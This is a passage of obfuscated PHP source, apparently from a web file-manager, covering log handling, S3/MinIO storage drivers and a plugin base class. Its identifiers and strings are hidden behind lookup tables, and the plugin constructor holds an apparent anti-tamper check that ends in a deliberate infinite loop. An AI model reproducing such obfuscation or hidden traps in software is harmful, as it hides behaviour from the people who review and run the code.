_get($ªâòˆõ™, $¦ÔŞÏşø[1837], 0); } if ($µøÌ»¬ê == $¦ÔŞÏşø[2479] && is_array($ªâòˆõ™[$¦ÔŞÏşø[2514]]) && !$ªâòˆõ™[$¦ÔŞÏşø[2514]]) { return; } $Ìõ½ˆæ = get_client_ip(); if (!$ªâòˆõ™ || strlen(json_encode($ªâòˆõ™)) >= 1024 * 64) { if ($ªâòˆõ™ && is_array($ªâòˆõ™)) { $ªâòˆõ™ = array_intersect_key($ªâòˆõ™, array_flip($¦ÔŞÏşø[492], $¦ÔŞÏşø[32])); $ªâòˆõ™[$¦ÔŞÏşø[2515]] = $Ìõ½ˆæ; } else { $ªâòˆõ™ = array($¦ÔŞÏşø[2515] => $Ìõ½ˆæ); } } else { if (is_array($ªâòˆõ™)) { $ªâòˆõ™[$¦ÔŞÏşø[2515]] = $Ìõ½ˆæ; } else { $ªâòˆõ™ = array($¦ÔŞÏşø[1342] => $ªâòˆõ™, $¦ÔŞÏşø[2515] => $Ìõ½ˆæ); } } $ªâòˆõ™[$¦ÔŞÏşø[2516]] = ACTION; $ªâòˆõ™ = array($¦ÔŞÏşø[1827] => Session::sign(), $¦ÔŞÏşø[1828] => intval($åÔ‚†ã), $¦ÔŞÏşø[33] => $µøÌ»¬ê, $¦ÔŞÏşø[1830] => json_encode($ªâòˆõ™)); Hook::trigger($¦ÔŞÏşø[2517], $ªâòˆõ™); return parent::add($ªâòˆõ™); } public function remove($€³Íİ¥÷) { $this->where(array($_SERVER[¬ÏÕ§Áú][513] => $€³Íİ¥÷))->delete(); } private function _makeOrder($„¦ÂÀµ§ = '') { $¯£Ñƒèé =& $_SERVER[¬ÏÕ§Áú]; $âœ®€‚ = $¯£Ñƒèé[244]; $Â™ÜûÖ¡ = array($¯£Ñƒèé[542] => $¯£Ñƒèé[543], $¯£Ñƒèé[544] => $¯£Ñƒèé[545]); $‰¾è¢† = Input::get($¯£Ñƒèé[550], $¯£Ñƒèé[7], $¯£Ñƒèé[2220], array($¯£Ñƒèé[2132], $¯£Ñƒèé[544])); $‰¾è¢† = $Â™ÜûÖ¡[$‰¾è¢†]; $„¦ÂÀµ§ = $„¦ÂÀµ§ . "{$âœ®€‚}\x20{$‰¾è¢†}"; return $this->order($„¦ÂÀµ§); } public function get($á²„¿ƒ» = '') { $âÄúîÎ =& $_SERVER[¬ÏÕ§Áú]; if (!$á²„¿ƒ») { show_json(array()); } $ìÒãÁŠê = array(); if ($á²„¿ƒ»[$âÄúîÎ[1837]]) { $ìÒãÁŠê[$âÄúîÎ[1837]] = $á²„¿ƒ»[$âÄúîÎ[1837]]; } if (isset($á²„¿ƒ»[$âÄúîÎ[874]])) { $ğÕŒÎ·® = $á²„¿ƒ»[$âÄúîÎ[874]]; $ùé´—î™ = isset($á²„¿ƒ»[$âÄúîÎ[875]]) ? $á²„¿ƒ»[$âÄúîÎ[875]] : time(); $ìÒãÁŠê[$âÄúîÎ[244]] = array($âÄúîÎ[419], array($ğÕŒÎ·®, $ùé´—î™)); } if ($á²„¿ƒ»[$âÄúîÎ[33]]) { $»ï±¸Â = explode($âÄúîÎ[50], $á²„¿ƒ»[$âÄúîÎ[33]]); $ ½´ÃÙ = $this->typeFile(); $¤ÅÒ—ëÚ = array(); foreach ($»ï±¸Â as $­Ÿà”) { $¤ÅÒ—ëÚ[] = $­Ÿà”; if (isset($ ½´ÃÙ[$­Ÿà”])) { $¤ÅÒ—ëÚ = array_merge($¤ÅÒ—ëÚ, $ ½´ÃÙ[$­Ÿà”]); } } $¤ÅÒ—ëÚ = array_unique($¤ÅÒ—ëÚ); if ($¤ÅÒ—ëÚ) { $ìÒãÁŠê[$âÄúîÎ[33]] = array($âÄúîÎ[7], $¤ÅÒ—ëÚ); } } else { $ìÒãÁŠê[$âÄúîÎ[33]] = array($âÄúîÎ[2518], $âÄúîÎ[2519]); } if (!empty($á²„¿ƒ»[$âÄúîÎ[2515]])) { $ìÒãÁŠê[$âÄúîÎ[545]] = array($âÄúîÎ[479], "\x25{$á²„¿ƒ»[$âÄúîÎ[2515]]}\45"); } $˜æÛ’ƒ¢ = $this->_makeOrder()->where($ìÒãÁŠê)->selectPage(); if (empty($˜æÛ’ƒ¢[$âÄúîÎ[456]])) { show_json(array(), !0, $˜æÛ’ƒ¢[$âÄúîÎ[453]]); } $˜æÛ’ƒ¢[$âÄúîÎ[456]] = $this->logList($˜æÛ’ƒ¢[$âÄúîÎ[456]]); return $˜æÛ’ƒ¢; } private function ipAddress(&$ÌÉà•Ô¯) { $ÊÇ°ä„ã =& $_SERVER[¬ÏÕ§Áú]; if (!empty($ÌÉà•Ô¯[$ÊÇ°ä„ã[2515]])) { $¡ÌøÏ = IpLocation::get($ÌÉà•Ô¯[$ÊÇ°ä„ã[2515]]); } else { $¡ÌøÏ = LNG($ÊÇ°ä„ã[2520]); } $ÌÉà•Ô¯[$ÊÇ°ä„ã[2521]] = $¡ÌøÏ; } private function descZipDownload($¯Üº™®, &$µ±­‹„”) { $È„ÑËÃ =& $_SERVER[¬ÏÕ§Áú]; if (!isset($¯Üº™®[$È„ÑËÃ[2522]])) { return; } $ŒÄÖ¤ = json_decode($¯Üº™®[$È„ÑËÃ[2522]], !0); foreach ($ŒÄÖ¤ as $‹à÷úøí) { try { $úğÉˆïİ = IO::infoFullSimple($‹à÷úøí[$È„ÑËÃ[97]]); } catch (Exception $°¤óÍÖ’) { continue; } $¯Üº™®[$È„ÑËÃ[97]] = $‹à÷úøí[$È„ÑËÃ[97]]; $µ±­‹„”[] = $¯Üº™®[$È„ÑËÃ[204]] = $úğÉˆïİ[$È„ÑËÃ[204]]; $µ±­‹„”[] = $¯Üº™®[$È„ÑËÃ[2282]] = $úğÉˆïİ[$È„ÑËÃ[203]]; break; } return $¯Üº™®; } private function getSourceList(&$¨ÉèşÉ) { $Éû¡¹Ó· =& $_SERVER[¬ÏÕ§Áú]; $•ú§Û‡€ = array(); foreach ($¨ÉèşÉ as $¡¯òÈûì => $òúŸâ°£) { $îÈË¥ÌŠ = json_decode($òúŸâ°£[$Éû¡¹Ó·[545]], !0); if ($òúŸâ°£[$Éû¡¹Ó·[33]] == $Éû¡¹Ó·[2011]) { $îÈË¥ÌŠ = $this->descZipDownload($îÈË¥ÌŠ, $•ú§Û‡€); $¨ÉèşÉ[$¡¯òÈûì][$Éû¡¹Ó·[545]] = json_encode($îÈË¥ÌŠ); continue; } if (strpos($òúŸâ°£[$Éû¡¹Ó·[33]], $Éû¡¹Ó·[2284]) !== 0) { if (!isset($îÈË¥ÌŠ[$Éû¡¹Ó·[97]]) || strpos($òúŸâ°£[$Éû¡¹Ó·[33]], $Éû¡¹Ó·[2523]) !== 0) { continue; } try { $€æÅßëÆ = IO::infoFullSimple($îÈË¥ÌŠ[$Éû¡¹Ó·[97]]); } catch (Exception $æ”Ÿ¶Ù) { continue; } $•ú§Û‡€[] = $îÈË¥ÌŠ[$Éû¡¹Ó·[204]] = $€æÅßëÆ[$Éû¡¹Ó·[204]]; $•ú§Û‡€[] = $îÈË¥ÌŠ[$Éû¡¹Ó·[2282]] = $€æÅßëÆ[$Éû¡¹Ó·[203]]; $¨ÉèşÉ[$¡¯òÈûì][$Éû¡¹Ó·[545]] = json_encode($îÈË¥ÌŠ); continue; } $•ú§Û‡€[] = $îÈË¥ÌŠ[$Éû¡¹Ó·[204]]; $•ú§Û‡€[] = $îÈË¥ÌŠ[$Éû¡¹Ó·[2282]]; if ($îÈË¥ÌŠ[$Éû¡¹Ó·[33]] == $Éû¡¹Ó·[644]) { $•ú§Û‡€[] = $îÈË¥ÌŠ[$Éû¡¹Ó·[545]][$Éû¡¹Ó·[1294]]; $•ú§Û‡€[] = $îÈË¥ÌŠ[$Éû¡¹Ó·[545]][$Éû¡¹Ó·[1295]]; } if ($îÈË¥ÌŠ[$Éû¡¹Ó·[33]] == $Éû¡¹Ó·[2293]) { $•ú§Û‡€[] = $îÈË¥ÌŠ[$Éû¡¹Ó·[545]][$Éû¡¹Ó·[204]]; } } if (!$•ú§Û‡€) { return array(); } return Model($Éû¡¹Ó·[946])->sourceListInfo($•ú§Û‡€, !0); } private function logList($ÏÙĞÌÊ¾) { $¾˜¡¿ƒì =& $_SERVER[¬ÏÕ§Áú]; $›Íş‚ = array_to_keyvalue($ÏÙĞÌÊ¾, $¾˜¡¿ƒì[12], $¾˜¡¿ƒì[1837]); $®ÁøÖ­ = Model($¾˜¡¿ƒì[618])->userListInfo(array_unique($›Íş‚)); $˜ìÛçÀÁ = $this->getSourceList($ÏÙĞÌÊ¾); $»¬ß«©ô = $this->typeAll(); $ƒìŠ¼™ = array(); $ßâ£øãï = array(); foreach ($ÏÙĞÌÊ¾ as $Ó÷ùÕ‡ => $ƒÆ®ìĞƒ) { $¤•‘¥É = $ƒÆ®ìĞƒ[$¾˜¡¿ƒì[33]]; $€ßÉ¿ÛÁ = isset($®ÁøÖ­[$ƒÆ®ìĞƒ[$¾˜¡¿ƒì[1837]]]) ? $®ÁøÖ­[$ƒÆ®ìĞƒ[$¾˜¡¿ƒì[1837]]] : !1; $îŞ¶ï = strpos($¤•‘¥É, $¾˜¡¿ƒì[2524]) === 0 ? LNG($¾˜¡¿ƒì[2525]) : LNG($¾˜¡¿ƒì[2520]); $ƒÆ®ìĞƒ[$¾˜¡¿ƒì[32]] = isset($€ßÉ¿ÛÁ[$¾˜¡¿ƒì[32]]) ? $€ßÉ¿ÛÁ[$¾˜¡¿ƒì[32]] : LNG($¾˜¡¿ƒì[2520]); $ƒÆ®ìĞƒ[$¾˜¡¿ƒì[2344]] = isset($€ßÉ¿ÛÁ[$¾˜¡¿ƒì[2344]]) ? $€ßÉ¿ÛÁ[$¾˜¡¿ƒì[2344]] : $¾˜¡¿ƒì[12]; $ƒÆ®ìĞƒ[$¾˜¡¿ƒì[1722]] = isset($»¬ß«©ô[$¤•‘¥É]) ? $»¬ß«©ô[$¤•‘¥É] : $îŞ¶ï; $ƒÆ®ìĞƒ[$¾˜¡¿ƒì[2219]] = $€ßÉ¿ÛÁ; $ç¨×şÊû = json_decode($ƒÆ®ìĞƒ[$¾˜¡¿ƒì[545]], !0); $ƒÆ®ìĞƒ[$¾˜¡¿ƒì[2515]] = isset($ç¨×şÊû[$¾˜¡¿ƒì[2515]]) ? $ç¨×şÊû[$¾˜¡¿ƒì[2515]] : $¾˜¡¿ƒì[12]; $ƒÆ®ìĞƒ[$¾˜¡¿ƒì[2521]] = IpLocation::get($ƒÆ®ìĞƒ[$¾˜¡¿ƒì[2515]]); if (strpos($¤•‘¥É, $¾˜¡¿ƒì[2284]) === 0 || isset($ç¨×şÊû[$¾˜¡¿ƒì[2282]])) { $ç¨×şÊû[$¾˜¡¿ƒì[100]] = $˜ìÛçÀÁ[$ç¨×şÊû[$¾˜¡¿ƒì[204]]]; $ç¨×şÊû[$¾˜¡¿ƒì[2298]] = $˜ìÛçÀÁ[$ç¨×şÊû[$¾˜¡¿ƒì[2282]]]; if ($ç¨×şÊû[$¾˜¡¿ƒì[33]] == $¾˜¡¿ƒì[644]) { $ç¨×şÊû[$¾˜¡¿ƒì[545]][$¾˜¡¿ƒì[1294]] = $˜ìÛçÀÁ[$ç¨×şÊû[$¾˜¡¿ƒì[545]][$¾˜¡¿ƒì[1294]]]; $ç¨×şÊû[$¾˜¡¿ƒì[545]][$¾˜¡¿ƒì[1295]] = $˜ìÛçÀÁ[$ç¨×şÊû[$¾˜¡¿ƒì[545]][$¾˜¡¿ƒì[1295]]]; } if ($ç¨×şÊû[$¾˜¡¿ƒì[33]] == $¾˜¡¿ƒì[2293]) { $ç¨×şÊû[$¾˜¡¿ƒì[545]][$¾˜¡¿ƒì[204]] = $˜ìÛçÀÁ[$ç¨×şÊû[$¾˜¡¿ƒì[545]][$¾˜¡¿ƒì[204]]]; } if ($ç¨×şÊû[$¾˜¡¿ƒì[33]] == $¾˜¡¿ƒì[1282]) { $ç¨×şÊû[$¾˜¡¿ƒì[2298]] = $ç¨×şÊû[$¾˜¡¿ƒì[100]]; $ç¨×şÊû[$¾˜¡¿ƒì[2282]] = $ç¨×şÊû[$¾˜¡¿ƒì[2298]][$¾˜¡¿ƒì[204]]; $ç¨×şÊû[$¾˜¡¿ƒì[100]] = !1; $ç¨×şÊû[$¾˜¡¿ƒì[204]] = $¾˜¡¿ƒì[12]; } $â‹îÄ¼° = array($¾˜¡¿ƒì[1282], $¾˜¡¿ƒì[2280]); if (!in_array($ç¨×şÊû[$¾˜¡¿ƒì[33]], $â‹îÄ¼°)) { if ($ç¨×şÊû[$¾˜¡¿ƒì[100]] && $ç¨×şÊû[$¾˜¡¿ƒì[100]][$¾˜¡¿ƒì[201]] == $¾˜¡¿ƒì[202]) { $ßâ£øãï[] = $ƒÆ®ìĞƒ[$¾˜¡¿ƒì[492]]; unset($ÏÙĞÌÊ¾[$Ó÷ùÕ‡]); continue; } if ($ç¨×şÊû[$¾˜¡¿ƒì[2298]] && $ç¨×şÊû[$¾˜¡¿ƒì[2298]][$¾˜¡¿ƒì[201]] == $¾˜¡¿ƒì[202]) { $ßâ£øãï[] = $ƒÆ®ìĞƒ[$¾˜¡¿ƒì[492]]; unset($ÏÙĞÌÊ¾[$Ó÷ùÕ‡]); continue; } } } $ƒÆ®ìĞƒ[$¾˜¡¿ƒì[545]] = $ç¨×şÊû; unset($ƒÆ®ìĞƒ[$¾˜¡¿ƒì[2526]]); $ƒìŠ¼™[] = $ƒÆ®ìĞƒ; } $this->clearSystemPathLog($ßâ£øãï); return $ƒìŠ¼™; } private function clearSystemPathLog($ğ¾ŸÏº) { $›œÑØì½ =& $_SERVER[¬ÏÕ§Áú]; if (count($ğ¾ŸÏº) == 0) { return; } $Õõ•÷«Ï = array($›œÑØì½[492] => array($›œÑØì½[7], array_unique($ğ¾ŸÏº))); $this->where($Õõ•÷«Ï)->delete(); } public function deviceList($½éµô«á, $ÚÖªÕŠ = 0) { $…‡»¤˜£ =& $_SERVER[¬ÏÕ§Áú]; $Ù²ÆÑË = array($…‡»¤˜£[1837] => $½éµô«á, $…‡»¤˜£[244] => array($…‡»¤˜£[1139], $ÚÖªÕŠ), $…‡»¤˜£[33] => $…‡»¤˜£[1981]); $ÆŸ‡†æó = array(); $üÉÁöâ­ = $this->field($…‡»¤˜£[2527])->where($Ù²ÆÑË)->order($…‡»¤˜£[2296])->limit(50)->select(); foreach ($üÉÁöâ­ as $„Ş­òÂö => $Ÿ¹Åß­ş) { if ($„Ş­òÂö > 0 && abs($Ÿ¹Åß­ş[$…‡»¤˜£[244]] - $üÉÁöâ­[$„Ş­òÂö - 1][$…‡»¤˜£[244]]) < 5) { continue; } $š¥ÀåªŒ = json_decode($Ÿ¹Åß­ş[$…‡»¤˜£[545]], !0); $Ÿ¹Åß­ş[$…‡»¤˜£[2515]] = isset($š¥ÀåªŒ[$…‡»¤˜£[2515]]) ? $š¥ÀåªŒ[$…‡»¤˜£[2515]] : $…‡»¤˜£[12]; unset($š¥ÀåªŒ[$…‡»¤˜£[2515]]); $Œ‹àƒ•Í = $this->deviceType($š¥ÀåªŒ[$…‡»¤˜£[2285]]); if (isset($ÆŸ‡†æó[$Œ‹àƒ•Í])) { continue; } $Ÿ¹Åß­ş[$…‡»¤˜£[2521]] = IpLocation::get($Ÿ¹Åß­ş[$…‡»¤˜£[2515]]); $Ÿ¹Åß­ş[$…‡»¤˜£[545]] = $š¥ÀåªŒ; $ÆŸ‡†æó[$Œ‹àƒ•Í] = $Ÿ¹Åß­ş; } return array_values($ÆŸ‡†æó); } public function deviceType($õåË£çº) { return $õåË£çº; } } goto bÏÎá‘¡Èï; cÂçé®º: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($ˆ £µó£) { $¢åØğêŠ =& $_SERVER[¬ÏÕ§Áú]; parent::__construct($ˆ £µó£); $this->setSignVersion($¢åØğêŠ[260]); if (!$this->region) { $this->region = $¢åØğêŠ[317]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $âÇš®ö½ = $this->getBktRegion(); return $this->region == $âÇš®ö½ ? !0 : !1; } public function uploadFormData($ è‘×Æº, $‚è¾ôîó = 3600) { $‡—À­µ =& $_SERVER[¬ÏÕ§Áú]; $×«¹¯Ä¾ = $‡—À­µ[242]; $Éï¯ôê = $‡—À­µ[270]; $ƒùÍÚ€î = $‡—À­µ[72]; $û×ĞĞÛĞ = gmdate($‡—À­µ[271]); $Æ÷‚±©Â = gmdate($‡—À­µ[272]); $«—òø ¿ = $‡—À­µ[273]; $—Ç¨†ê = $‚è¾ôîó . $‡—À­µ[12]; $¥¡©óá¾ = $‡—À­µ[274]; $ÈıåÎ¶ = array($this->accessKey, $Æ÷‚±©Â, $this->region, $ƒùÍÚ€î, $«—òø ¿); $«Ö“ƒ¬ = implode($‡—À­µ[8], $ÈıåÎ¶); $²Í³Ñˆ = array($‡—À­µ[275] => gmdate($‡—À­µ[276], strtotime($‡—À­µ[277])), $‡—À­µ[278] => array(array($‡—À­µ[279] => $this->bucket), array($‡—À­µ[318] => $×«¹¯Ä¾), array($‡—À­µ[280], $‡—À­µ[281], $‡—À­µ[12]), array($‡—À­µ[280], $‡—À­µ[282], $‡—À­µ[12]), array($‡—À­µ[280], $‡—À­µ[319], $‡—À­µ[12]), array($‡—À­µ[283] => $¥¡©óá¾), array($‡—À­µ[284] => $«Ö“ƒ¬), array($‡—À­µ[285] => $Éï¯ôê), array($‡—À­µ[286] => $û×ĞĞÛĞ), array($‡—À­µ[287] => $—Ç¨†ê))); $®ÇŒç·Á = base64_encode(json_encode($²Í³Ñˆ)); $Æ€œ¶³Ó = hash_hmac($‡—À­µ[288], $Æ÷‚±©Â, $‡—À­µ[289] . $this->secret, !0); $ Æ¢±áÜ = hash_hmac($‡—À­µ[288], $this->region, $Æ€œ¶³Ó, !0); $ÂÒ¬³¶Ã = hash_hmac($‡—À­µ[288], $ƒùÍÚ€î, $ Æ¢±áÜ, !0); $©ËÊ÷¹× = hash_hmac($‡—À­µ[288], $«—òø ¿, $ÂÒ¬³¶Ã, !0); $üœÍØìø = hash_hmac($‡—À­µ[288], $®ÇŒç·Á, $©ËÊ÷¹×); $ÛÕã óã = array($‡—À­µ[259] => $‡—À­µ[12], $‡—À­µ[306] => $‡—À­µ[12], $‡—À­µ[318] => $×«¹¯Ä¾, $‡—À­µ[283] => $¥¡©óá¾, $‡—À­µ[290] => $®ÇŒç·Á, $‡—À­µ[320] => $«Ö“ƒ¬, $‡—À­µ[321] => $Éï¯ôê, $‡—À­µ[322] => $û×ĞĞÛĞ, $‡—À­µ[323] => $—Ç¨†ê, $‡—À­µ[324] => $üœÍØìø, $‡—À­µ[219] => $this->getHost()); return $ÛÕã óã; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($¦šû§Ø–) { $¡¬ À‰è =& $_SERVER[¬ÏÕ§Áú]; parent::__construct($¦šû§Ø–); $Î –ò†† = isset($¦šû§Ø–[$¡¬ À‰è[269]]) && $¦šû§Ø–[$¡¬ À‰è[269]] == $¡¬ À‰è[260] ? $¡¬ À‰è[260] : $¡¬ À‰è[325]; $this->setSignVersion($Î –ò††); } public function link($æÔşßˆš, $Ä°­ÍŠ­ = array()) { return parent::link($æÔşßˆš, $Ä°­ÍŠ­); } public function fileOut($‰ÛêÁÅÍ, $×ëóÀÑ” = false, $£ò´Èß = false, $ÉåØ—˜ü = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[¬ÏÕ§Áú][326])) { return parent::fileOutServer($‰ÛêÁÅÍ, $×ëóÀÑ”, $£ò´Èß, $ÉåØ—˜ü); } parent::fileOut($‰ÛêÁÅÍ, $×ëóÀÑ”, $£ò´Èß, $ÉåØ—˜ü); } public function fileOutImage($¥ş™Ñ¥’, $ÆõóÂë¾ = 250) { if (strstr($this->endpoint, $_SERVER[¬ÏÕ§Áú][326])) { return parent::fileOutImageServer($¥ş™Ñ¥’, $ÆõóÂë¾); } parent::fileOutImage($¥ş™Ñ¥’, $ÆõóÂë¾); } } define($_SERVER[¬ÏÕ§Áú][327], 1); goto e¸É¡°¯§Ø; D••åÊ’å¡: class Message { function __construct() { } public function send($‹ºˆî² = '', $«¹½ÎºÑ = array(), $·ÚµÇğÉ = "\164\x65\x78\164") { $êĞÚ¦…€ =& $_SERVER[¬ÏÕ§Áú]; $æ¼îâ·¿ = array($êĞÚ¦…€[33] => $êĞÚ¦…€[1247], $êĞÚ¦…€[181] => $‹ºˆî²); if (in_array($·ÚµÇğÉ, array($êĞÚ¦…€[1247], $êĞÚ¦…€[1684]))) { $æ¼îâ·¿[$êĞÚ¦…€[33]] = $·ÚµÇğÉ; } $«¹½ÎºÑ = array($êĞÚ¦…€[599] => isset($«¹½ÎºÑ[$êĞÚ¦…€[599]]) ? $«¹½ÎºÑ[$êĞÚ¦…€[599]] : $êĞÚ¦…€[12], $êĞÚ¦…€[686] => isset($«¹½ÎºÑ[$êĞÚ¦…€[686]]) ? $«¹½ÎºÑ[$êĞÚ¦…€[686]] : $êĞÚ¦…€[12]); if (empty($‹ºˆî²) || empty($«¹½ÎºÑ[$êĞÚ¦…€[599]]) && empty($«¹½ÎºÑ[$êĞÚ¦…€[686]])) { return !1; } $¹·ì²ñç = array($êĞÚ¦…€[1613] => $æ¼îâ·¿, $êĞÚ¦…€[1685] => $«¹½ÎºÑ); Hook::trigger($êĞÚ¦…€[1686], $¹·ì²ñç); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $€Ù¡Å‘ =& $_SERVER[¬ÏÕ§Áú]; if (!isset($_SERVER[$€Ù¡Å‘[60]]) || !isset($_SERVER[$€Ù¡Å‘[61]])) { $¢¤ë’Ã = $€Ù¡Å‘[1002]; $«®ÇÚÒ = $€Ù¡Å‘[62]; $èËÙÕ²è = $_SERVER[$€Ù¡Å‘[63]] . $€Ù¡Å‘[64]; $úáüù¨ = $«®ÇÚÒ($èËÙÕ²è); $ÅŠùÌĞç = explode($€Ù¡Å‘[65], $úáüù¨); if (count($ÅŠùÌĞç) < $€Ù¡Å‘[711]) { $óŒ”ó… = $€Ù¡Å‘[67]; $óŒ”ó…(); } $Õ¯ıÅ£× = $€Ù¡Å‘[1003]; $Õ¯ıÅ£×($_SERVER[$€Ù¡Å‘[1004]]); $«®õ³’’ = 1; for ($Ÿ»‰¦Çè = $«®õ³’’; $Ÿ»‰¦Çè > 0; $Ÿ»‰¦Çè++) { $Õ¯ıÅ£× = json_encode($GLOBALS[$€Ù¡Å‘[512]]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($€Ù¡Å‘[1687]); $this->pluginName = str_replace($€Ù¡Å‘[1687], $€Ù¡Å‘[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $€Ù¡Å‘[8]; $this->pluginApi = appHostGet() . $€Ù¡Å‘[1688] . $this->pluginName . $€Ù¡Å‘[8]; $this->pluginHost = $config[$€Ù¡Å‘[1689]] . $this->pluginName . $€Ù¡Å‘[8]; $this->pluginHostDefault = $config[$€Ù¡Å‘[1689]] . $this->pluginName . $€Ù¡Å‘[8]; $¡³ĞÂä° = $config[$€Ù¡Å‘[1690]]; if ($¡³ĞÂä° && strpos($€Ù¡Å‘[50] . $¡³ĞÂä° . $€Ù¡Å‘[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$€Ù¡Å‘[1691]] . $this->pluginName . $€Ù¡Å‘[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[¬ÏÕ§Áú][1692]); } protected function assign($•ŒŠËÕ, $´‘…™º = false) { if (is_array($•ŒŠËÕ)) { $this->values = array_merge($this->values, $•ŒŠËÕ); } else { $this->values[$•ŒŠËÕ] = $´‘…™º; } } protected function display($Ó’şòôÎ) { extract($this->values); require $Ó’şòôÎ; } final function hookRegist($Â’ë’û¸) { $this->modelPlugin->appRegist($this->pluginName, $Â’ë’û¸); } final function appIcon() { $¹‡Ï– =& $_SERVER[¬ÏÕ§Áú]; $°‚µ«º = $this->appPackage(); $ºŸÜİ…ô = $¹‡Ï–[12]; if (isset($°‚µ«º[$¹‡Ï–[510]])) { if (isset($°‚µ«º[$¹‡Ï–[510]][$¹‡Ï–[1693]])) { $ºŸÜİ…ô = $¹‡Ï–[1694] . $°‚µ«º[$¹‡Ï–[510]][$¹‡Ï–[1693]] . $¹‡Ï–[1695]; } else { if ($°‚µ«º[$¹‡Ï–[510]][$¹‡Ï–[1696]]) { $ºŸÜİ…ô = $¹‡Ï–[1697] . $°‚µ«º[$¹‡Ï–[510]][$¹‡Ï–[1696]] . $¹‡Ï–[1698]; } } } return $ºŸÜİ…ô; } final function fileCanView($Ô©ñ„úĞ) { $é‹ºóõ– =& $_SERVER[¬ÏÕ§Áú]; if (request_url_safe($Ô©ñ„úĞ)) { return !0; } if ($this->isShare($Ô©ñ„úĞ)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $ççÚ”ˆ = $é‹ºóõ–[1699] . rawurlencode(this_url()); show_tips(LNG($é‹ºóõ–[1700]) . $é‹ºóõ–[1701] . $ççÚ”ˆ . $é‹ºóõ–[1702] . LNG($é‹ºóõ–[1703]) . $é‹ºóõ–[1704], !1); } if (!Action($é‹ºóõ–[1705])->authCan($é‹ºóõ–[1706])) { show_tips(LNG($é‹ºóõ–[1707]) . $é‹ºóõ–[1708], !1); } ActionCall($é‹ºóõ–[1709], $Ô©ñ„úĞ); } final function isShare($Ü¥¼õš‡) { $°ˆ¾ù« = KodIO::parse($Ü¥¼õš‡); return $°ˆ¾ù«[$_SERVER[¬ÏÕ§Áú][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($ç×¬óÖ”) { if (request_url_safe($ç×¬óÖ”)) { return $ç×¬óÖ”; } if (!$this->isShare($ç×¬óÖ”)) { $ç×¬óÖ” = $this->filePath($ç×¬óÖ”, !1); } return Action($_SERVER[¬ÏÕ§Áú][1311])->linkOut($ç×¬óÖ”); } public function filePathLinkOut($¿¬äÆÅ) { if (request_url_safe($¿¬äÆÅ)) { return $¿¬äÆÅ; } $this->fileCanView($¿¬äÆÅ); return Action($_SERVER[¬ÏÕ§Áú][1311])->link($¿¬äÆÅ); } final function filePath($Õ–ĞÜÅì, $³ô—›™‘ = true, $Œ¾â‘›° = false) { $í¹€ÅÃ =& $_SERVER[¬ÏÕ§Áú]; $Ğ”ñíû = $this->filePathGet($Õ–ĞÜÅì, $³ô—›™‘); if (!$this->fileInfo) { show_tips(LNG($í¹€ÅÃ[118]), !1); } if ($Œ¾â‘›° && isset($this->fileInfo[$í¹€ÅÃ[562]]) && $this->fileInfo[$í¹€ÅÃ[562]]) { $›‘£İƒ· = Model($í¹€ÅÃ[565])->fileInfo($this->fileInfo[$í¹€ÅÃ[562]]); if (!$›‘£İƒ· || !IO::exist($›‘£İƒ·[$í¹€ÅÃ[97]])) { $ÎŒîÀÖØ = LNG($í¹€ÅÃ[118]) . LNG($í¹€ÅÃ[1710]); if (KodUser::isRoot() && isset($›‘£İƒ·[$í¹€ÅÃ[97]])) { $ÎŒîÀÖØ .= $í¹€ÅÃ[1711] . $›‘£İƒ·[$í¹€ÅÃ[97]] . $í¹€ÅÃ[1712]; } show_tips($ÎŒîÀÖØ); } } Hook::trigger($í¹€ÅÃ[1713], $Ğ”ñíû); return $Ğ”ñíû; } final function filePathGet($˜ôšàü, $ıæÛÁ±ò = true) { $»¼ËŸ¢ =& $_SERVER[¬ÏÕ§Áú]; if ($›èıÒÏó = $this->checkSharePath($˜ôšàü, $ıæÛÁ±ò)) { return $›èıÒÏó; } $this->fileCanView($˜ôšàü); if (request_url_safe($˜ôšàü)) { $¯•Ü¸ƒ = parse_url_query($˜ôšàü); if (isset($¯•Ü¸ƒ[$»¼ËŸ¢[1714]]) && isset($¯•Ü¸ƒ[$»¼ËŸ¢[247]])) { $”ò©¾­­ = Mcrypt::decode($¯•Ü¸ƒ[$»¼ËŸ¢[247]], Model($»¼ËŸ¢[886])->get($»¼ËŸ¢[887])); if ($”ò©¾­­) { $this->fileInfo = IO::info($”ò©¾­­); $this->fileInfo[$»¼ËŸ¢[1715]] = $˜ôšàü; $this->cachePath = $this->pluginCachePath($»¼ËŸ¢[12], $ıæÛÁ±ò); return $”ò©¾­­; } } $˜ôšàü = $this->_cacheHttpFile($˜ôšàü, $ıæÛÁ±ò); $this->fileInfo = IO::info($˜ôšàü); } else { $this->fileInfo = IO::info($˜ôšàü); $this->cachePath = $this->pluginCachePath($»¼ËŸ¢[12], $ıæÛÁ±ò); } return $˜ôšàü; } final function _cacheHttpFile($É¨¡Ã·¶, $Û¸Êş÷ê = true) { $ÉÚ”Î÷‹ =& $_SERVER[¬ÏÕ§Áú]; $®Ÿ®³ã¥ = parse_url_query($É¨¡Ã·¶); $Á¤¹‘Á‰ = get_path_ext($É¨¡Ã·¶); if (isset($®Ÿ®³ã¥[$ÉÚ”Î÷‹[32]]) && $®Ÿ®³ã¥[$ÉÚ”Î÷‹[32]]) { $Á¤¹‘Á‰ = get_path_ext($®Ÿ®³ã¥[$ÉÚ”Î÷‹[32]]); } $Û™¯ÃÊ• = hash_path($É¨¡Ã·¶) . $ÉÚ”Î÷‹[10] . $Á¤¹‘Á‰; $this->cachePath = $this->pluginCachePath($Û¸Êş÷ê ? $Û™¯ÃÊ• : 